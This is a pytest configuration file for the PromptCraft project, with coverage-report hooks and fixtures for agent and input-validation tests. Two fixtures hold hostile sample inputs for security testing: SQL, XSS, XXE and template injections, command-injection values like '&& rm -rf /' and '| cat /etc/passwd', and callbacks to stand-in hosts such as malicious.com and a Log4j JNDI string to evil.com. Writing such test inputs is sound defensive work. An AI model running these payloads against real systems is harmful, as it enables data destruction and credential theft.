"""
Pytest configuration and custom hooks for PromptCraft testing.
Automatically generates test-type-specific coverage reports.
"""

import json
import shutil
import subprocess
import sys
import time
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Any

import pytest

from src.agents.base_agent import BaseAgent
from src.agents.models import AgentConfig, AgentInput, AgentOutput
from src.agents.registry import AgentRegistry

# Coverage hook functionality integrated directly to avoid plugin conflicts

# Global variable to track which test types were executed
executed_test_types: set[str] = set()


def pytest_runtest_protocol(item, nextitem):
    """Hook called for each test to track test types by path and markers."""
    global executed_test_types  # noqa: PLW0602

    # Extract markers from the test item
    markers = [marker.name for marker in item.iter_markers()]

    # Get test file path to determine test type
    test_path = str(item.fspath)

    # Map test paths to test types (primary method for VS Code)
    if "tests/unit/" in test_path:
        executed_test_types.add("unit")
    elif "tests/integration/" in test_path:
        executed_test_types.add("integration")
    elif "tests/auth/" in test_path:
        executed_test_types.add("auth")
    elif "tests/examples/" in test_path:
        executed_test_types.add("examples")
    elif "tests/performance/" in test_path:
        executed_test_types.add("performance")
    elif "tests/contract/" in test_path:
        executed_test_types.add("contract")
    else:
        # Fallback to marker-based detection
        test_type_markers = {
            "unit": "unit",
            "integration": "integration",
            "auth": "auth",
            "performance": "performance",
            "stress": "stress",
        }

        for marker, test_type in test_type_markers.items():
            if marker in markers:
                executed_test_types.add(test_type)
                break

    # Call the default implementation


def pytest_sessionfinish(session, exitstatus):
    """Hook called after all tests are completed."""
    global executed_test_types  # noqa: PLW0602

    # Enhanced coverage detection for VS Code integration
    coverage_enabled = (
        any("--cov" in arg for arg in sys.argv)
        or any("coverage" in arg.lower() for arg in sys.argv)
        or any("--cov-report" in arg for arg in sys.argv)
        or hasattr(session.config, "_cov")
        or getattr(session.config.option, "cov_source", None)
        or getattr(session.config.option, "cov", None)
    )

    # Also check if coverage.xml or .coverage files exist (indicates coverage was run)
    project_root = Path(__file__).parent.parent
    coverage_files_exist = (project_root / "coverage.xml").exists() or (project_root / ".coverage").exists()

    # Trigger if coverage is detected or coverage files exist
    if coverage_enabled or coverage_files_exist:
        # Trigger automatic coverage report generation (user's primary request)
        trigger_automatic_coverage_reports()

    # Only generate organized reports if coverage was enabled and tests were run
    if not executed_test_types:
        return

    if not (coverage_enabled or coverage_files_exist):
        return

    # Skip the lightweight generation since we're already generating detailed reports
    # via trigger_automatic_coverage_reports() above
    print("\n✅ Detailed coverage reports generated automatically")


def trigger_automatic_coverage_reports():
    """Trigger automatic coverage report generation (user's primary request)."""
    # Small delay to allow coverage files to be written
    time.sleep(0.5)

    # Find the coverage hook script
    project_root = Path(__file__).parent.parent
    hook_script = project_root / "scripts" / "generate_test_coverage_fast.py"

    if not hook_script.exists():
        print("⚠️  Coverage report generator not found")
        return

    try:
        # Execute the coverage report generator with quieter output but still show key info
        result = subprocess.run(  # noqa: S603
            [sys.executable, str(hook_script), "--quiet"],
            check=False,
            capture_output=True,
            text=True,
            timeout=30,
        )

        if result.returncode == 0:
            print("\n✅ Coverage reports updated automatically")
            # Show key report locations
            reports_dir = project_root / "reports" / "coverage"
            if reports_dir.exists():
                print(f"📊 Main Report: {reports_dir / 'index.html'}")
                print(f"📋 Standard Report: {reports_dir / 'standard' / 'index.html'}")
        else:
            print("\n⚠️  Coverage report generation had issues:")
            if result.stderr:
                print(f"   Error: {result.stderr.strip()}")
            if result.stdout:
                print(f"   Output: {result.stdout.strip()}")

    except subprocess.TimeoutExpired:
        print("\n⚠️  Coverage report generation timed out")
    except Exception as e:
        print(f"\n⚠️  Coverage report generation failed: {e}")


def generate_lightweight_reports(test_types: set[str]):
    """Generate lightweight organized reports without recursive pytest calls."""
    try:
        # Create organized structure
        reports_dir = Path("reports/coverage/by-type")
        reports_dir.mkdir(parents=True, exist_ok=True)

        # Move standard htmlcov to organized location
        if Path("htmlcov").exists():
            standard_dir = Path("reports/coverage/standard")
            if standard_dir.exists():
                shutil.rmtree(standard_dir)
            Path("htmlcov").rename(standard_dir)
            print("  📋 Organized standard coverage: reports/coverage/standard/")

        # Also move any htmlcov-by-type content to organized location
        if Path("htmlcov-by-type").exists():
            by_type_dir = Path("reports/coverage/by-type")
            if by_type_dir.exists():
                shutil.rmtree(by_type_dir)
            Path("htmlcov-by-type").rename(by_type_dir)
            print("  📋 Organized detailed coverage: reports/coverage/by-type/")

        # Create navigation index for VS Code integration
        create_vscode_navigation_index(test_types)

        print("  ✅ Organized coverage reports available at: reports/coverage/")
        print("  🔗 Navigation: reports/coverage/index.html")

    except Exception as e:
        print(f"  ⚠️  Could not organize reports: {e}")


def check_detailed_reports_status():
    """Check if detailed by-type reports exist and are current."""

    by_type_dir = Path("reports/coverage/by-type")
    standard_dir = Path("reports/coverage/standard")

    if not by_type_dir.exists() or not standard_dir.exists():
        return {"status": "missing", "message": "Detailed reports not found"}

    # Get timestamps
    try:
        standard_time = standard_dir.stat().st_mtime
        by_type_time = by_type_dir.stat().st_mtime

        # If detailed reports are more than 5 minutes older than standard, they're stale
        if (standard_time - by_type_time) > 300:  # 5 minutes in seconds
            age_hours = (standard_time - by_type_time) / 3600
            return {"status": "stale", "message": f"Detailed reports are {age_hours:.1f} hours old"}
        return {"status": "current", "message": "Detailed reports are current"}

    except Exception:
        return {"status": "unknown", "message": "Could not check report timestamps"}


def create_vscode_navigation_index(test_types: set[str]):
    """Create lightweight navigation index for VS Code integration."""

    # Check if detailed reports exist and are current
    check_detailed_reports_status()

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>PromptCraft Coverage Reports (VS Code Integration)</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #333; border-bottom: 3px solid #007acc; padding-bottom: 10px; }}
            .report-card {{ background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; padding: 20px; margin: 15px 0; }}
            .report-card h3 {{ margin: 0 0 10px 0; color: #007acc; }}
            .report-card a {{ display: inline-block; background: #007acc; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; }}
            .report-card a:hover {{ background: #005a9e; }}
            .info {{ background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 20px 0; }}
            .test-types {{ background: #f0f8e6; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Coverage Reports (Auto-Generated)</h1>

            <div class="info">
                <p><strong>Generated automatically by VS Code "Run Tests with Coverage"</strong></p>
                <p>This navigation page is created each time you run coverage in VS Code, organizing your reports for easy access.</p>
            </div>

            <div class="test-types">
                <h3>🧪 Test Types Executed:</h3>
                <p>This run included: <strong>{', '.join(sorted(test_types)) if test_types else 'Various test types'}</strong></p>
            </div>

            <div class="report-card">
                <h3>📈 Standard Coverage Report</h3>
                <p>Complete project coverage analysis from your VS Code test run.</p>
                <a href="standard/index.html">View Standard Coverage →</a>
            </div>

            <div class="report-card">
                <h3>🔧 Detailed Test-Type Reports</h3>
                <p>Test-type-specific coverage breakdowns (unit, integration, auth, etc.).</p>
                <a href="by-type/index.html">View Detailed Reports →</a>
                <p><small><em>Note: Use scripts/generate_test_type_coverage_clean.py to generate fresh detailed reports</em></small></p>
            </div>

            <div class="info">
                <h3>📋 Quick Actions:</h3>
                <ul>
                    <li><strong>VS Code Integration:</strong> This page auto-updates with each coverage run</li>
                    <li><strong>Detailed Analysis:</strong> Use <code>python scripts/generate_test_type_coverage_clean.py</code></li>
                    <li><strong>File Organization:</strong> All reports organized in <code>reports/coverage/</code></li>
                </ul>
            </div>
        </div>
    </body>
    </html>
    """

    index_file = Path("reports/coverage/index.html")
    index_file.write_text(html_content)


def generate_test_type_reports(test_types: set[str]):
    """Generate HTML coverage reports for each executed test type."""

    # Create output directory
    output_dir = Path("htmlcov-by-type")
    output_dir.mkdir(exist_ok=True)

    # Test type configurations
    test_configs = {
        "unit": ("tests/unit/", "Unit Tests"),
        "integration": ("tests/integration/", "Integration Tests"),
        "auth": ("tests/auth/", "Authentication Tests"),
        "performance": ("tests/performance/", "Performance Tests"),
        "stress": ("tests/performance/", "Stress Tests"),
    }

    coverage_summary = {}
    reports_generated = []

    for test_type in test_types:
        if test_type not in test_configs:
            continue

        test_path, description = test_configs[test_type]
        print(f"  📊 Generating {description} coverage...")

        try:
            # Ensure reports directory exists
            reports_dir = Path("reports/coverage")
            reports_dir.mkdir(parents=True, exist_ok=True)

            # Generate coverage report for this specific test type with organized output
            cmd = [
                "poetry",
                "run",
                "pytest",
                "--cov=src",
                f"--cov-report=html:{output_dir}/{test_type}",
                f"--cov-report=xml:reports/coverage/coverage-{test_type}.xml",
                f"--junitxml=reports/temp/junit-{test_type}.xml",
                "--tb=no",  # Suppress traceback output
                "--quiet",  # Minimize output
                "-m",
                test_type,
                test_path,
            ]

            # Create temp directory for junit files
            Path("reports/temp").mkdir(parents=True, exist_ok=True)

            subprocess.run(cmd, check=False, capture_output=True, text=True, cwd=Path.cwd())  # noqa: S603

            # Add custom header to the HTML report
            html_file = output_dir / test_type / "index.html"
            if html_file.exists():
                add_custom_header(html_file, description, test_type, test_path)
                reports_generated.append((test_type, description))

                # Extract coverage percentage from organized location
                xml_file = Path(f"reports/coverage/coverage-{test_type}.xml")
                if xml_file.exists():
                    coverage_summary[test_type] = extract_coverage_percentage(xml_file)

        except Exception as e:
            print(f"  ❌ Failed to generate {description} report: {e}")

    if reports_generated:
        # Generate navigation index
        generate_navigation_index(output_dir, reports_generated, coverage_summary)

        print("  ✅ Test-type-specific coverage reports generated!")
        print(f"  📁 Reports location: {output_dir}")
        print("  🔗 Available reports:")
        for test_type, description in reports_generated:
            print(f"    • {description}: {output_dir}/{test_type}/index.html")


def add_custom_header(html_file: Path, description: str, test_type: str, test_path: str):
    """Add custom header with test type information to HTML report."""
    try:
        content = html_file.read_text()

        custom_header = f"""
        <div style="background: #e6f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 4px solid #007acc;">
            <h3 style="margin: 0 0 10px 0; color: #333;">📊 {description} Coverage Report</h3>
            <p style="margin: 0; color: #666;">
                <strong>Test Type:</strong> {description} |
                <strong>Marker:</strong> {test_type} |
                <strong>Path:</strong> {test_path}
            </p>
        </div>
        """

        content = content.replace("<h1>Coverage report</h1>", f"<h1>Coverage report: {description}</h1>{custom_header}")

        html_file.write_text(content)

    except Exception as e:
        print(f"  ⚠️  Could not customize {description} report: {e}")


def extract_coverage_percentage(xml_file: Path) -> dict[str, float]:
    """Extract coverage percentage from XML report."""
    try:
        tree = ET.parse(xml_file)  # noqa: S314
        root = tree.getroot()

        return {
            "percentage": float(root.attrib["line-rate"]) * 100,
            "covered": int(root.attrib["lines-covered"]),
            "total": int(root.attrib["lines-valid"]),
        }
    except Exception:
        return {"percentage": 0, "covered": 0, "total": 0}


def generate_navigation_index(output_dir: Path, reports: list, coverage_summary: dict):
    """Generate navigation index page."""

    report_cards = []
    for test_type, description in reports:
        coverage_info = coverage_summary.get(test_type, {"percentage": 0})
        coverage_pct = coverage_info["percentage"]

        icon_map = {"unit": "🧪", "integration": "🔗", "auth": "🔐", "performance": "🏃‍♂️", "stress": "💪"}

        icon = icon_map.get(test_type, "📊")

        report_cards.append(
            f"""
            <div class="report-card">
                <h3>{icon} {description}</h3>
                <p><strong>Coverage: {coverage_pct:.2f}%</strong><br>
                Auto-generated from VS Code test execution.</p>
                <a href="{test_type}/index.html">View {description} →</a>
            </div>
        """,
        )

    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>PromptCraft Coverage Reports by Test Type</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
            .container {{ max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
            h1 {{ color: #333; border-bottom: 3px solid #007acc; padding-bottom: 10px; }}
            .report-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 30px 0; }}
            .report-card {{ background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 8px; padding: 20px; transition: transform 0.2s; }}
            .report-card:hover {{ transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.15); }}
            .report-card h3 {{ margin: 0 0 10px 0; color: #007acc; }}
            .report-card p {{ color: #666; margin: 0 0 15px 0; }}
            .report-card a {{ display: inline-block; background: #007acc; color: white; padding: 8px 16px; text-decoration: none; border-radius: 4px; }}
            .report-card a:hover {{ background: #005a9e; }}
            .stats {{ background: #e8f4fd; padding: 15px; border-radius: 5px; margin: 20px 0; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 PromptCraft Coverage Reports (Auto-Generated)</h1>

            <div class="stats">
                <p><strong>Generated from VS Code test execution</strong> - These reports were automatically created based on the test types that were executed in VS Code.</p>
            </div>

            <div class="report-grid">
                {''.join(report_cards)}
            </div>

            <div class="stats">
                <h3>📋 How to Use These Reports:</h3>
                <ul>
                    <li><strong>Red lines:</strong> Not covered by this test type</li>
                    <li><strong>Green lines:</strong> Covered by this test type</li>
                    <li><strong>Auto-refresh:</strong> Reports update each time you run tests in VS Code</li>
                </ul>
            </div>
        </div>
    </body>
    </html>
    """

    index_file = output_dir / "index.html"
    index_file.write_text(html_content)


# Reset test types at the start of each session
def pytest_sessionstart(session):
    """Reset tracking at the start of each test session."""
    global executed_test_types  # noqa: PLW0602
    executed_test_types.clear()


# Agent Testing Fixtures
# These fixtures support comprehensive agent system testing across unit, integration, and security tests.


@pytest.fixture
def fresh_agent_registry():
    """
    Provide a clean AgentRegistry instance for each test.

    This fixture ensures complete test isolation by creating a fresh registry
    instance and clearing it after each test to prevent state leakage.

    Yields:
        AgentRegistry: Fresh registry instance for the test
    """
    registry = AgentRegistry()
    yield registry
    # Cleanup: clear all registrations to prevent state leakage
    registry.clear()


@pytest.fixture
def mock_agent_class():
    """
    Provide a mock BaseAgent class that passes all validation requirements.

    This fixture creates a fully compliant BaseAgent implementation that can be used
    for testing registry functionality without requiring real agent logic.

    Returns:
        Type[BaseAgent]: Mock agent class suitable for testing
    """

    class MockTestAgent(BaseAgent):
        """Mock agent class for testing purposes."""

        def __init__(self, config):
            super().__init__(config)
            self.test_call_count = 0

        async def execute(self, agent_input):
            """Mock execute method that returns a valid response."""
            self.test_call_count += 1
            return AgentOutput(
                content=f"Mock response {self.test_call_count}",
                confidence=0.9,
                processing_time=0.1,
                agent_id=self.agent_id,
                request_id=agent_input.request_id,
            )

        def get_capabilities(self):
            """Mock capabilities for testing."""
            return {
                "input_types": ["text"],
                "output_types": ["text"],
                "mock_agent": True,
                "test_mode": True,
            }

    return MockTestAgent


@pytest.fixture
def security_test_inputs():
    """
    Provide a comprehensive list of potentially malicious inputs for security testing.

    This fixture includes various attack vectors commonly used in security testing,
    based on OWASP guidelines and common injection techniques. These inputs help
    validate that the system handles malicious content safely.

    Returns:
        List[str]: List of potentially malicious input strings for security testing
    """
    # Based on OWASP Top 10 and common injection techniques
    return [
        # SQL Injection attempts
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "1' UNION SELECT * FROM users--",
        # NoSQL Injection attempts
        "{ '$ne': null }",
        "'; return db.users.find(); var dummy='",
        # XSS attempts
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert('XSS')>",
        # Command Injection attempts
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        # Path Traversal attempts
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # Template Injection attempts
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        # LDAP Injection attempts
        "*)(uid=*",
        "admin)(&(password=*))",
        # XML/XXE attempts
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
        # Buffer Overflow attempts (long strings)
        "A" * 10000,
        "B" * 100000,
        # Special characters and encoding
        "%00",  # Null byte
        "%2e%2e%2f",  # URL encoded ../
        "\x00\x01\x02\x03",  # Binary data
        "\r\n\r\n",  # CRLF injection
        # Unicode and encoding edge cases
        "𝓤𝓷𝓲𝓬𝓸𝓭𝓮",  # Unicode mathematical script  # noqa: RUF001
        "🚀🔥💻",  # Emojis
        "\ufeff",  # BOM character
        # Empty and whitespace edge cases
        "",  # Empty string
        " ",  # Single space
        "\t\n\r",  # Whitespace characters
        None,  # None value (converted to string)
        # Large payloads
        json.dumps({"key": "value" * 1000}),  # Large JSON
        # Protocol-specific attacks
        "file:///etc/passwd",
        "http://malicious.com/callback",
        "ftp://anonymous@malicious.com/",
        # Deserialization attacks
        'O:8:"stdClass":0:{}',  # PHP object
        "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA",  # Java serialized
    ]


# Performance Testing Fixtures
# These fixtures support comprehensive performance and edge case testing across unit, integration, and security tests.


class PerformanceMetrics:
    """
    Performance measurement utility for boundary condition testing.

    Provides timing capabilities with configurable thresholds for
    performance-sensitive test assertions.
    """

    def __init__(self, max_duration: float | None = None) -> None:
        self._start: float | None = None
        self._end: float | None = None
        self._max: float | None = max_duration

    def start(self) -> None:
        """Start timing measurement."""
        self._start = time.perf_counter()

    def stop(self) -> None:
        """Stop timing measurement."""
        self._end = time.perf_counter()

    @property
    def duration(self) -> float:
        """Get measured duration in seconds."""
        if self._start is None or self._end is None:
            raise RuntimeError("start() and stop() must both be called")
        return self._end - self._start

    def assert_max_duration(self, max_seconds: float | None = None) -> None:
        """Assert that measured duration doesn't exceed threshold."""
        limit = max_seconds if max_seconds is not None else self._max
        if limit is None:
            raise ValueError("No max duration specified for assertion")
        assert self.duration <= limit, f"Execution time {self.duration:.6f}s exceeds limit of {limit}s"


@pytest.fixture
def performance_metrics() -> PerformanceMetrics:
    """
    Provide a PerformanceMetrics instance for performance boundary tests.

    Default max_duration is set to 5.0 seconds to accommodate various
    data sizes in boundary condition testing.

    Returns:
        PerformanceMetrics: Timing utility with configurable thresholds
    """
    return PerformanceMetrics(max_duration=5.0)


@pytest.fixture(
    params=[
        None,  # Null configuration
        {},  # Empty configuration
        {"invalid": "config"},  # Invalid configuration structure
        {"app_name": ""},  # Empty app name
        {"app_name": None},  # Null app name
        {"app_name": "a" * 1000},  # Very long app name
        {"app_name": "\x00\x01"},  # Binary data in app name
        {"app_name": "🚀🔥💯"},  # Unicode in app name
        {"valid": "config"},  # Valid baseline configuration
    ],
)
def config_edge_cases(request) -> Any:
    """
    Provide parametrized configuration edge cases for validation testing.

    Covers critical edge cases including None values, empty configurations,
    invalid structures, malformed data, and security-focused edge cases.

    Returns:
        Any: Configuration value for edge case testing
    """
    return request.param


@pytest.fixture(
    params=[
        None,  # Null input
        "",  # Empty string
        "x",  # Single character
        "x" * 10,  # Small input
        "x" * 1000,  # Medium input
        "x" * 10000,  # Large input
        "x" * 100000,  # Very large input
        "\x00\x01",  # Binary data
        "🚀🔥💯",  # Unicode/emoji
        "\n\r\t",  # Whitespace characters
        "SELECT * FROM users;",  # SQL-like input
        "<script>alert('xss')</script>",  # XSS-like input
        "../../../etc/passwd",  # Path traversal
        "${jndi:ldap://evil.com/a}",  # Log4j-style injection
        "'; DROP TABLE users; --",  # SQL injection
        "{{7*7}}",  # Template injection
        0,  # Integer zero
        -1,  # Negative integer
        3.14,  # Float
        [],  # Empty list
        {},  # Empty dict
        ["item1", "item2"],  # Non-empty list
        {"key": "value"},  # Non-empty dict
    ],
)
def edge_case_inputs(request) -> Any:
    """
    Provide parametrized edge case inputs for input validation testing.

    Comprehensive collection including boundary values, type variations,
    security attack vectors, and malformed data to ensure robust
    input handling across all components.

    Returns:
        Any: Input value for edge case testing
    """
    return request.param


# Agent Models Testing Fixtures
# These fixtures support comprehensive agent model testing for validation, serialization, and edge cases.


@pytest.fixture
def sample_agent_input():
    """
    Provide a sample AgentInput instance for testing.

    This fixture creates a comprehensive AgentInput example that includes all optional
    fields populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentInput: Sample agent input with comprehensive data
    """
    return AgentInput(
        content="This is a test input for the agent",
        context={"language": "python", "framework": "fastapi", "content_type": "text", "priority": "normal"},
        config_overrides={"max_tokens": 500, "temperature": 0.7, "timeout": 30.0},
    )


@pytest.fixture
def sample_agent_output():
    """
    Provide a sample AgentOutput instance for testing.

    This fixture creates a comprehensive AgentOutput example that includes all fields
    populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentOutput: Sample agent output with comprehensive data
    """
    return AgentOutput(
        content="This is a test output from the agent",
        metadata={"analysis_type": "security", "rules_checked": 10, "issues_found": 0, "processing_stage": "complete"},
        confidence=0.95,
        processing_time=1.234,
        agent_id="test_agent",
        request_id="test-request-123",
    )


@pytest.fixture
def sample_agent_config_model():
    """
    Provide a sample AgentConfig instance for testing.

    This fixture creates a comprehensive AgentConfig example that includes all fields
    populated with realistic values for thorough testing of model functionality.

    Returns:
        AgentConfig: Sample agent config with comprehensive data
    """
    return AgentConfig(
        agent_id="test_agent",
        name="Test Agent",
        description="A test agent for unit testing",
        config={"max_tokens": 1000, "temperature": 0.8, "model": "gpt-4", "features": ["analysis", "generation"]},
        enabled=True,
    )


@pytest.fixture
def sample_agent_config(sample_agent_config_model):
    """
    Provide a sample agent config as dict for BaseAgent testing.

    This fixture converts the Pydantic model to a dict format that BaseAgent.__init__
    expects (dict[str, Any]). It maintains single source of truth by deriving from
    the sample_agent_config_model fixture.

    This fixture resolves the mismatch between test expectations and BaseAgent API:
    - Tests expect: dict config for BaseAgent(config: dict[str, Any])
    - Previous fixture provided: Pydantic model

    Returns:
        dict[str, Any]: Agent configuration as dict compatible with BaseAgent
    """
    # Convert Pydantic model to dict using Pydantic v2 syntax
    base_config = sample_agent_config_model.model_dump()

    # Extract the nested config and merge with top-level fields for BaseAgent compatibility
    return {
        "agent_id": base_config["agent_id"],
        "name": base_config["name"],
        "description": base_config["description"],
        "enabled": base_config["enabled"],
        # Flatten the nested config for BaseAgent compatibility
        **base_config["config"],
    }
